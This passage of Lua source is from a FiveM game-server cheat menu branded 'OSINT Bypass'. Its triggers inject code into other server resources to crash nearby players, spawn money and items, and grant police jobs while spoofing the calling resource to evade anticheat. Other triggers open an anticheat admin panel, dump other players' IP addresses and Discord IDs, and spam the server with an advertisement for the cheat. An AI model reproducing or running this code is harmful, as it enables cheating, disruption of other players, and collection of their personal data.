                        { type = "subMenu", label = "Banners",
                            subTabs = {
                                { icon = "", type = "button", label = "Red Banner (Default)",
                                    onSelect = function()
                                        OSINT:SendMessage({ action = "updateBanner", bannerColor = "150, 0, 0", bannerLink = "https://r2.fivemanage.com/j0YlVJ9wWJTFeImwfmRK2/OSINTBypassBanner.png" })
                                    end 
                                },
                            }
                        },
                        { type = "scrollable", label = "Menu Positioning (X)", desc = "This is the menu positioning based on the X-Axis.", value = 1, values = { "Left", "Center", "Right" },
                            onSelect = function()
                                print("Selected - Menu Positioning (X)")
                            end
                        },
                        { type = "scrollable", label = "Menu Positioning (Y)", desc = "This is the menu positioning based on the Y-Axis.", value = 1, values = { "Top", "Middle", "Bottom" },
                            onSelect = function()
                                print("Selected - Menu Positioning (Y)")
                            end
                        },
                    }
                },
            }
        },
    }

    CurrentMenu = ActiveMenu
    CurrentCategories = nil
    CurrentCategoryIndex = 1
    HoveredIndex = 1
end

local function AddTrigger(data)
    for _, menu in ipairs(ActiveMenu) do
        if menu.label == "Server" then
            for _, cat in ipairs(menu.categories) do
                if cat.label == "Triggers" then
                    cat.tabs[#cat.tabs + 1] = data
                    return
                end
            end
        end
    end
end

function OSINT:UpdateTabChecked(menu, label, checked)
    for _, tab in pairs(menu or {}) do
        if tab.label == label and (tab.type == "checkbox" or tab.type == "slider-checkbox" or tab.type:find("checkbox")) then
            tab.checked = checked
        elseif tab.type == "subMenu" then
            if tab.categories then
                for _, cat in pairs(tab.categories) do
                    self:UpdateTabChecked(cat.tabs, label, checked)
                end
            end
            
            if tab.subTabs then
                self:UpdateTabChecked(tab.subTabs, label, checked)
            end
        end
    end
end

function OSINT:ShowKeybindList(binds)
    self:SendMessage({ action = "displayBinds", visible = true, binds = binds })
end

function OSINT:HideKeybindList()
    self:SendMessage({ action = "displayBinds", visible = false })
end

function OSINT:GetNearbyPlayers(coords, maxDistance, includePlayer)
    local nearby = {}
    local myPed = PlayerPedId()
    maxDistance = maxDistance or 350.0

    if not myPed or not DoesEntityExist(myPed) or not IsPlayerPlaying(PlayerId()) then
        nearby = {}
        return nearby
    end

    local activePlayers = GetActivePlayers()

    if activePlayers then
        for _, playerId in ipairs(activePlayers) do
            if includePlayer or playerId ~= PlayerId() then
                local ped = GetPlayerPed(playerId)
                if ped and DoesEntityExist(ped) and IsEntityAPed(ped) and not IsEntityDead(ped) then
                    local playerCoords = GetEntityCoords(ped)
                    if playerCoords then
                        local distance = #(coords - playerCoords)
                        if distance <= maxDistance then
                            nearby[#nearby + 1] = {
                                name = GetPlayerName(playerId),
                                serverId = GetPlayerServerId(playerId)
                            }
                        end
                    end
                end
            end
        end
    else
        local handle, ped = FindFirstPed()
        local success

        repeat
            if ped and IsPedAPlayer(ped) and DoesEntityExist(ped) then
                local playerId = NetworkGetPlayerIndexFromPed(ped)
                if playerId ~= -1 and (includePlayer or playerId ~= PlayerId()) then
                    local playerCoords = GetEntityCoords(ped)
                    if playerCoords then
                        local distance = #(coords - playerCoords)
                        if distance <= maxDistance then
                            nearby[#nearby + 1] = {
                                name = GetPlayerName(playerId),
                                serverId = GetPlayerServerId(playerId)
                            }
                        end
                    end
                end
            end
            success, ped = FindNextPed(handle)
        until not success
        EndFindPed(handle)
    end

    if #nearby == 0 then
        nearby = {}
    end

    return nearby
end

CreateThread(function()
    OSINT:Initialize()
    OSINT:BuildDefaultMenu()
    OSINT:UpdateElements(CurrentMenu)
    Wait(1000)
    OSINT:Notify("success", "OSINT", "You have loaded OSINT Bypass, welcome!", 3000)
    Wait(1000)
    OSINT:Notify("info", "OSINT", "Your key will never expire, thanks for using OSINT Bypass!", 3000)
    Wait(1000)

    -- AddTrigger({ type = "button", label = "Example Trigger",
    --     onSelect = function()
    --     end
    -- })

    -- AddTrigger({ type = "checkbox", label = "Example Trigger 2", checked = false,
    --     onSelect = function(checked)
    --         if checked then
    --             -- On
    --         else
    --             -- Off
    --         end
    --     end
    -- })


if GetResourceState("ox_lib") == "started" or GetResourceState("lb-phone") == "started" or GetResourceState("monitor") == "started" or GetResourceState("core") == "started" or GetResourceState("es_extended") == "started" or GetResourceState("qb-core") == "started" or GetResourceState("ox_lib") == "started" then
    AddTrigger({
        type = "button",
        label = "Deobfuscate Events",
        onSelect = function()
            OSINT:HideUI()
            local resourceName = nil
            local done = false

            KeyboardInput("Resource Name", "", function(val)
                if val and val ~= "" then
                    resourceName = val
                end
                done = true
            end, "typeable")

            while not done do
                Wait(100)
            end

            if not resourceName or resourceName == "" then
                MachoMenuNotification("Error", "No resource name entered.")
                OSINT:ShowUI()
                return
            end

            if GetResourceState(resourceName) ~= "started" then
                MachoMenuNotification("Error", "Resource ^3" .. resourceName .. "^7 is not started or doesn’t exist.")
                OSINT:ShowUI()
                return
            end

            local payload = [[
                local d = function(t)
                    local s = ""
                    for i = 1, #t do s = s .. string.char(t[i]) end
                    return s
                end
                local g = function(e) return _G[d(e)] end
                local w = function(ms) Citizen.Wait(ms) end

                local function SimpleJsonEncode(value)
                    if type(value) == "table" then
                        local parts = {}
                        local isArray = true
                        local maxIndex = 0
                        for k, _ in pairs(value) do
                            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                isArray = false
                                break
                            end
                            maxIndex = math.max(maxIndex, k)
                        end
                        if isArray then
                            for i = 1, maxIndex do
                                local v = value[i]
                                parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                            end
                            return "[" .. table.concat(parts, ",") .. "]"
                        else
                            for k, v in pairs(value) do
                                if type(k) == "string" then
                                    parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                                end
                            end
                            return "{" .. table.concat(parts, ",") .. "}"
                        end
                    elseif type(value) == "string" then
                        return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                    elseif type(value) == "number" or type(value) == "boolean" then
                        return tostring(value)
                    elseif value == nil then
                        return "null"
                    else
                        return "\"[unserializable:" .. type(value) .. "]\""
                    end
                end

                local function HookNative(nativeName, newFunction)
                    local original = _G[nativeName]
                    if original and type(original) == "function" then
                        _G[nativeName] = function(...)
                            local info = debug.getinfo(2, "Sln")
                            return newFunction(original, ...)
                        end
                    end
                end

                local te = d({84,114,105,103,103,101,114,69,118,101,110,116})  -- TriggerEvent
                local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116}) -- TriggerServerEvent

                HookNative(te, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5CLIENT^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)

                HookNative(tse, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5SERVER^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)
            ]]

            Injection(resourceName, payload)

            MachoMenuNotification("Injector", "Hooks injected into ^3" .. resourceName .. "^7 successfully!")
            OSINT:ShowUI()
        end
    })
end

    if GetResourceState("ox_lib") == "started" then
    AddTrigger({
        type = "button",
        label = "Crash Nearby Players",
        onSelect = function()
        if GetResourceState("WaveShield") == "started" then
            OSINT:Notify("error", "OSINT", "Ban Prevention: Cannot Use this on WaveShield", 3000)
            return
        end
            MachoInjectResourceRaw("ox_lib", [[
                CreateObject = function() end

                local model <const> = 'p_spinning_anus_s'
                local props <const> = {}

                for i = 1, 600 do
                    props[i] = {
                        model = model,
                        coords = vec3(0.0, 0.0, 0.0),
                        pos = vec3(0.0, 0.0, 0.0),
                        rot = vec3(0.0, 0.0, 0.0)
                    }
                end

                local plyState <const> = LocalPlayer.state

                plyState:set('lib:progressProps', props, true)
                Wait(1000)
                plyState:set('lib:progressProps', nil, true)
        ]])
        end,
    })
end

    if GetResourceState("dpemotes") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({ 
            type = "button", 
            label = "Bring All Nearby Players",
            onSelect = function()
                OSINT:Notify("success", "OSINT", "Attempting to bring all players", 3000)
                MachoInjectThread(0, 'dpemotes', '', [[
                    TriggerServerEvent('ServerValidEmote', "-1", "horse", "horse")
                ]])
            end
        })
    end

    if GetResourceState('mc9-adminmenu') == 'started' then
        AddTrigger({
            type = "button",
            label = "Admin Menu List (F8)",
            onSelect = function()
                OSINT:Notify("success", "OSINT", "Admin Menu List", 3000)

            MachoInjectResource2(NewThreadNs, "mc9-adminmenu", [[
                for id, ply in pairs(CurrentPlayers or {}) do
                    if ply and ply.name and ply.id then
                        print(("Information about ^6%s ^7| ^2%s"):format(ply.name, ply.id))
                        
                        if ply.identifiers and ply.identifiers.ip then
                            print(("    IP: ^2%s"):format(ply.identifiers.ip:sub(4)))
                        else
                            print("    IP: ^1Not Available")
                        end
                        
                        if ply.identifiers and ply.identifiers.discord then
                            print(("    Discord: ^2%s"):format(ply.identifiers.discord:sub(9)))
                        else
                            print("    Discord: ^1Not Available")
                        end
                    end
                end
            ]])
            end,
        })
    end    

    if GetResourceState('mc9-mainmenu') == 'started' then
        AddTrigger({
            type = "button",
            label = "MC9 Item Spawner",
            onSelect = function()
            OSINT:Notify("success", "OSINT", "Spawning Items", 3000)
            MachoInjectResource2(NewThreadNs, "mc9-mainmenu", [[
            local data, playtime = mc9.callback.await("mc9-mainmenu:server:GetMilestoneReward", false)
            for i,v in pairs(data) do
                local result, message = mc9.callback.await("mc9-mainmenu:server:claimMilestoneReward", v)
            end
            ]])
            end,
        })
    end

    if GetResourceState('vMenu') == 'started' then
        AddTrigger({
            type = "button",
            label = "Message Server",
            onSelect = function()
                OSINT:Notify("success", "OSINT", "Message Sent", 3000)

                MachoInjectResource2(1, "any", [[
                    TriggerServerEvent('vMenu:SendMessageToPlayer', -1, 'Hello this is repercing with OSINT Bypass, the leading cheat in the market. Join our discord at https://discord.gg/6zXK6wNu')
                ]])
            end,
        })
    end


    if GetResourceState("amigo") == "started" then
        AddTrigger({
            type = "button",
            label = "Give Item #1",
            onSelect = function()
                OSINT:HideUI()

                local function GetInput(title, default)
                    local result = nil
                    local done = false

                    KeyboardInput(title, default or "", function(val)
                        result = val
                        done = true
                    end, "typeable")

                    while not done do
                        Wait(0)
                    end

                    return result
                end

                print("^7[^5OSINT^7] [^3DEBUG^7]: Waiting for item input...")

                local itemName = GetInput("Item Name", "")
                print("^7[^5OSINT^7] [^3DEBUG^7]: Raw itemName =", tostring(itemName))

                if not itemName or itemName == "" then
                    print("^7[^5OSINT^7] [^1ERROR^7]: Invalid or empty itemName")
                    OSINT:Notify("error", "OSINT", "No item name entered", 3000)
                    OSINT:ShowUI()
                    return
                end

                print("^7[^5OSINT^7] [^3DEBUG^7]: Waiting for item count input...")

                local inputCount = GetInput("Item Count", "1")
                print("^7[^5OSINT^7] [^3DEBUG^7]: Raw inputCount =", tostring(inputCount))

                local itemCount = tonumber(inputCount)
                if not itemCount or itemCount < 1 then
                    print("^7[^5OSINT^7] [^1WARN^7]: Invalid count, defaulting to 1")
                    itemCount = 1
                end
                if itemCount > 100000 then
                    print("^7[^5OSINT^7] [^1WARN^7]: Count too high, clamping to 100000")
                    itemCount = 100000
                end

                itemName  = tostring(itemName or "")
                itemCount = tonumber(itemCount or 1)

                print("^7[^5OSINT^7] [^3DEBUG^7]: Final itemName =", itemName)
                print("^7[^5OSINT^7] [^3DEBUG^7]: Final itemCount =", itemCount)

                local success, err = pcall(function()
                    MachoInjectResourceRaw("amigo", string.format([[
                        -- Hook native functions safely
                        local function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then return end
                            _G[nativeName] = function(...)
                                print(("^7[^5OSINT^7] [^3DEBUG^7]: Hooked Native - %%s"):format(nativeName))
                                return newFunction(originalNative, ...)
                            end
                        end

                        HookNative("TriggerEvent", function(originalFn, ...) return originalFn(...) end)
                        HookNative("TriggerServerEvent", function(originalFn, ...) return originalFn(...) end)

                        _G.OSINT = {
                            TEvent = function(eName, ...) return TriggerEvent(eName, ...) end,
                            TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end,
                        }

                        print("^7[^5OSINT^7] [^3DEBUG^7]: Sending giveItem request for %s x%d")
                        _G.OSINT.TSEvent('player:giveItem', { item = "%s", count = %d })
                    ]], itemName, itemCount, itemName, itemCount))
                end)

                if not success then
                    print("^7[^5OSINT^7] [^1ERROR^7]: string.format failed →", err)
                    print("^7[^5OSINT^7] [^3DEBUG^7]: itemName =", tostring(itemName), "itemCount =", tostring(itemCount))
                    OSINT:Notify("error", "OSINT", "String format failed — check console", 4000)
                else
                    print("^7[^5OSINT^7] [^2INFO^7]: Injection completed successfully")
                end

                OSINT:ShowUI()
            end
        })
    end

    local scriptsRunning = GetResourceState("scripts") == "started"
    local frameworkRunning = GetResourceState("framework") == "started"

    if scriptsRunning or frameworkRunning then
        local runningResource = scriptsRunning and "scripts" or "framework"
        AddTrigger({
            type = "button",
            label = "End Comserv",
            onSelect = function()
                OSINT:Notify("Comserv", "OSINT", "Action Removed you might have to spam this", 3000)
                MachoInjectResourceRaw(runningResource, [[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end

                    local function g(n) return _G[decode(n)] end

                    for i = 1, 1 do
                        lib.callback("comservs:completeAction", false, function(entity) print(entity) end)
                        g({87,97,105,116})(0)
                    end
                ]])
            end
        })
    end

    if GetResourceState("es_extended") == "started" or GetResourceState("core") == "started" then
        AddTrigger({
            type = "button",
            label = "Setjob Police #1 (New)",
            onSelect = function()
                if GetResourceState("es_extended") == "started" then
                    OSINT:Notify("Setjob", "OSINT", "Your job has been set to police", 3000)
                    MachoInjectResource2(NewThreadNs, "es_extended", [[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]])
                elseif GetResourceState("core") == "started" then
                    OSINT:Notify("Setjob", "OSINT", "Your job has been set to police", 3000)
                    MachoInjectResource2(NewThreadNs, "core", [[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]])
                else
                    print("Neither core nor es_extended started")
                end
            end
        })
    end

    if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({ 
            type = "button", 
            label = "Set Job #2(Police)",
            onSelect = function()
                OSINT:Notify("Setjob", "OSINT", "Your job has been set to police", 3000)
                MachoInjectResourceRaw("any", [[
                    local lp = LocalPlayer
                    if lp and lp.state then
                        lp.state:set("job", {
                            name = "police",
                            label = "Police",
                            grade = 4,
                            grade_name = "sergeant"
                        }, true)
                        print("[✅] Job set to police successfully.")
                    else
                        print("[⚠️] Failed to set job: LocalPlayer or state not available.")
                    end
                ]])
            end
        })
    end

    if GetResourceState("codewave-sneaker-phone") == "started" then
        AddTrigger({ 
            type = "button", 
            label = "Give Shoes Reward",
            onSelect = function()
                MachoInjectResource2(NewThreadNs, "codewave-sneaker-phone", [[
                    function HookNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end
                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    HookNative("TriggerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    HookNative("TriggerServerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    _G.OSINT = {
                        TEvent = function(eName, ...)
                            return TriggerEvent(eName, ...)
                        end,
                        TSEvent = function(eName, ...)
                            return TriggerServerEvent(eName, ...)
                        end,
                    }

                    _G.OSINT.TSEvent('delivery:giveRewardShoes', 1000)
                    print("[✅] reward triggered successfully.")
                ]])
            end
        })
    end

    if GetResourceState("rzrp-base") == "started" then
        AddTrigger({
            type = "checkbox",
            label = "Ragdoll Players (RZRP)",
            checked = false,
            onSelect = function(checked)
                if checked then
                OSINT:Notify("Ragdoll", "OSINT", "Ragdolling Nearby Players", 4000)
                    Injection("rzrp-base", [[
                        if not _G.OSINTRagdollPlayersInitialized then
                            _G.OSINTRagdollPlayersEnabled = true
                            _G.OSINTRagdollPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            -- Stop any existing ragdoll thread before creating a new one
                            if _G.OSINTRagdollThread then
                                TerminateThread(_G.OSINTRagdollThread)
                                _G.OSINTRagdollThread = nil
                            end

                            _G.OSINTRagdollThread = SafeThread(function()
                                while _G.OSINTRagdollPlayersEnabled and _G.OSINTRagdollPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 30000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:Slap', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.OSINTRagdollThread = nil
                            end)
                        else
                            _G.OSINTRagdollPlayersEnabled = true
                        end
                    ]])
                else
                OSINT:Notify("Ragdoll", "OSINT", "Stopped Ragdolling Players", 4000)
                    Injection("rzrp-base", [[
                        _G.OSINTRagdollPlayersEnabled = false
                        _G.OSINTRagdollPlayersInitialized = false
                        if _G.OSINTRagdollThread then
                            TerminateThread(_G.OSINTRagdollThread)
                            _G.OSINTRagdollThread = nil
                        end
                    ]])
                end
            end
        })
    end

    if GetResourceState("rzrp-base") == "started" then
        AddTrigger({
            type = "checkbox",
            label = "Bag Closest Players (RZRP)",
            checked = false,
            onSelect = function(checked)
                if checked then
                    print('Bag Closest Players Started...')
                    Injection("rzrp-base", [[
                        if not _G.OSINTBagPlayersInitialized then
                            _G.OSINTBagPlayersEnabled = true
                            _G.OSINTBagPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            if _G.OSINTBagThread then
                                TerminateThread(_G.OSINTBagThread)
                                _G.OSINTBagThread = nil
                            end

                            _G.OSINTBagThread = SafeThread(function()
                                while _G.OSINTBagPlayersEnabled and _G.OSINTBagPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 300000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:BagClosestPlayer', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.OSINTBagThread = nil
                            end)
                        else
                            _G.OSINTBagPlayersEnabled = true
                        end
                    ]])
                else
                    print('Bag Closest Players Stopped...')
                    Injection("rzrp-base", [[
                        _G.OSINTBagPlayersEnabled = false
                        _G.OSINTBagPlayersInitialized = false
                        if _G.OSINTBagThread then
                            TerminateThread(_G.OSINTBagThread)
                            _G.OSINTBagThread = nil
                        end
                    ]])
                end
            end
        })
    end

    if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({ 
            type = "button", 
            label = "Set Gang",
            onSelect = function()
                local gangName = ""
                local gangRank = 1
                OSINT:HideUI()
                KeyboardInput("Gang Name", "", function(val)
                    if val and val ~= "" then
                        gangName = val
                    end
                end, "typeable")
                Wait(2300)
                KeyboardInput("Gang Rank", "", function(val)
                    if val and val ~= "" then
                        gangRank = tonumber(val) or 1
                    end
                end, "typeable")
                Wait(1000)
                local targetResource = GetResourceState("scripts") == "started" and "scripts" or "framework"
                local injectionCode = string.format([[
                    LocalPlayer.state:set("gang", "%s", true)
                    LocalPlayer.state:set("gang_rank", %d, true)
                ]], gangName, gangRank)
                Injection(targetResource, injectionCode)
                OSINT:ShowUI()
                OSINT:Notify("success", "OSINT", "Gang Set", 4000)
            end
        })
    end

    if GetResourceState("framework") == "started" then
        AddTrigger({
            type = "button",
            label = "Give Item #2",
            onSelect = function()
                OSINT:HideUI()

                local function GetInput(title, default)
                    local result = nil
                    local done = false

                    KeyboardInput(title, default or "", function(val)
                        result = val
                        done = true
                    end, "typeable")

                    while not done do
                        Wait(0)
                    end

                    return result
                end

                print("^7[^5OSINT^7] [^3DEBUG^7]: Waiting for item input...")

                local itemName = GetInput("Item Name", "")
                print("^7[^5OSINT^7] [^3DEBUG^7]: Raw itemName =", tostring(itemName))

                if not itemName or itemName == "" then
                    print("^7[^5OSINT^7] [^1ERROR^7]: Invalid or empty itemName")
                    OSINT:Notify("error", "OSINT", "No item name entered", 3000)
                    OSINT:ShowUI()
                    return
                end

                print("^7[^5OSINT^7] [^3DEBUG^7]: Waiting for item count input...")

                local inputCount = GetInput("Item Count", "1")
                print("^7[^5OSINT^7] [^3DEBUG^7]: Raw inputCount =", tostring(inputCount))

                local itemCount = tonumber(inputCount)
                if not itemCount or itemCount < 1 then
                    print("^7[^5OSINT^7] [^1WARN^7]: Invalid count, defaulting to 1")
                    itemCount = 1
                end
                if itemCount > 100000 then
                    print("^7[^5OSINT^7] [^1WARN^7]: Count too high, clamping to 100000")
                    itemCount = 100000
                end

                itemName  = tostring(itemName or "")
                itemCount = tonumber(itemCount or 1)

                print("^7[^5OSINT^7] [^3DEBUG^7]: Final itemName =", itemName)
                print("^7[^5OSINT^7] [^3DEBUG^7]: Final itemCount =", itemCount)

                local success, err = pcall(function()
                    MachoInjectResourceRaw("framework", string.format([[
                        TriggerServerEvent('drugs:receive', {
                            Reward = {
                                Name = "%s",
                                Amount = %d
                            }
                        })
                    ]], itemName, itemCount))
                end)

                if not success then
                    print("^7[^5OSINT^7] [^1ERROR^7]: string.format failed →", err)
                    OSINT:Notify("error", "OSINT", "String format failed — check console", 4000)
                else
                    print("^7[^5OSINT^7] [^2INFO^7]: Injection completed successfully")
                    OSINT:Notify("success", "OSINT", "Item Sent", 4000)
                end

                OSINT:ShowUI()
            end
        })
    end

    if GetResourceState("WayTooCerti_3D_Printer") == 'started' then
        AddTrigger({ type = "button", label = "Give Item #3",
            onSelect = function()
            MachoInjectResourceRaw("WayTooCerti_3D_Printer", [[
                local function Ak47Spawn()
                TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', 'money', 10000)
                end
                Ak47Spawn()
            ]])
            end
        })
    end

    if GetResourceState("tm-base") == "started" then
        table.insert(events, {
            name = "Spawn Money #4",
            eventName = "give_metro_money_04",
            execute = function()
                print('Give Money Metro RP...')
                MachoInjectResource2(NewThreadNs, "tm-base", [[
                TriggerServerEvent('tm-moneywash:giveCleanMoney', 100000)
                ]])
            end
        })
    end


    if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({
            type = "button",
            label = "Set Chat Tag",
            onSelect = function()
                OSINT:HideUI()

                local function GetInput(title, default)
                    local result = nil
                    local done = false

                    KeyboardInput(title, default or "", function(val)
                        result = val
                        done = true
                    end, "typeable")

                    while not done do
                        Wait(0)
                    end

                    return result
                end

                local tagName = GetInput("Chat Tag Name", "")
                if not tagName or tagName == "" then
                    OSINT:ShowUI()
                    return
                end

                Wait(500)

                local colorInput = GetInput("Tag Color (R, G, B)", "0, 255, 0")
                if not colorInput or colorInput == "" then
                    colorInput = "255, 255, 255"
                end

                Wait(500)

                local targetResource = GetResourceState("scripts") == "started" and "scripts" or "framework"
                MachoInjectResourceRaw(targetResource, string.format([[
                    LocalPlayer.state:set('currentChatTag', { tag = "%s", color = "%s" }, true)
                ]], tagName, colorInput))

                OSINT:ShowUI()
            end
        })
    end

if GetResourceState("wasabi_multijob") == 'started' then
    AddTrigger({ type = "button", label = "Set Job #3 (Police)",
        onSelect = function()
        MachoInjectResource2(NewThreadNs, "wasabi_multijob", [[
            local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
            CheckJob(job, true) 
        ]])
        MachoInjectResource2(NewThreadNs, "wasabi_multijob", [[
            SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
        ]])
        end
    })
end

if GetResourceState("wasabi_multijob") == 'started' then
    AddTrigger({ type = "button", label = "Set Job #2 (EMS)",
        onSelect = function()
        MachoInjectResource2(NewThreadNs, "wasabi_multijob", [[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
            CheckJob(job, true)
        ]])
        MachoInjectResource2(NewThreadNs, "wasabi_multijob", [[
            SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
        ]])
        end
    })
end


if GetResourceState("ElectronAC") == 'started' then
    AddTrigger({ type = "button", label = "ElectronAC Admin Panel",
        onSelect = function()
        MachoInjectResourceRaw("ElectronAC", [[
        SetNuiFocus(true, true)
        SendNUIMessage({
            action = "menu",
            data = {
                info = {
                    adminContext = {
                        master = true,
                        permissions = { "all" }
                    },
                    identifiers = {
                        ["ip"] = "127.0.0.1",
                        ["license"] = "",
                        ["license2"] = "",
                    },
                    permissions = {
                        adminMenu = true,
                        whitelisted = true
                    }
                },
                open = true,
                setOpen = true
            }
        })
        ]])
        end
    })
end

if GetResourceState("spoodyFraud") == 'started' then
    AddTrigger({ type = "button", label = "Give Money #1",
        onSelect = function()
        MachoInjectResource2(NewThreadNs, 'spoodyFraud', [[
        function HookNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        HookNative("CreateThread", function(originalFn, ...)
            return originalFn(...)
        end)

        HookNative("TriggerServerEvent", function(originalFn, ...)
            return originalFn(...)
        end)

        function Spoody()
            for i = 1, 30 do
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Swapped Sim Card')
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Cloned Card')

                Citizen.Wait(5)

                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
            end
        end

        CreateThread(function()
            Spoody()
        end)
        ]])
        end
    })
end

    KeyboardInput("Choose Menu Key", "", function(val)
        for vk, name in pairs(MappedKeys) do
            if name:lower() == val:lower() then
                MenuKey = name
                Wait(250)
                OSINT:ShowUI()
                return
            end
        end
    end, "keybind")

    local lastSliderPress = 0
    local sliderDelay = 120

    while true do
        Wait(0)

        if FreecamEnabled then
            local hoveredOption = FreecamOptions[FreecamHoveredIndex]

            -- Scroll Wheel
            if IsControlJustReleased(0, 14) then -- Wheel Down
                FreecamHoveredIndex = (FreecamHoveredIndex % #FreecamOptions) + 1
                MachoSendDuiMessage(DUI, json.encode({ action = "scroll", direction = "down" }))
            end

